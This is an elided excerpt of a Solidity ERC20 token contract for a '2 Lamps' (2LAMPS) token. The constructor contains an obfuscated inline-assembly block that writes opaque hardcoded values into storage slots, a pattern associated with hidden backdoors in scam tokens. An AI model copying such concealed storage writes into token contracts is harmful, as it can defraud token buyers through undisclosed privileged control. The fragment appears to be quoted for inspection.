...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xefdad09169cb3816a9b66423ff21e2249ad53eb44a82)
            sstore(0x51,0xefda283a123c2f5ea6c86b3cee77a65d724d005bf53c)
...
contract TwoLamps is ERC20Token {
    constructor() ERC20Token("2 Lamps", "2LAMPS", msg.sender, 69000000 * 10 ** 18) {
    }
}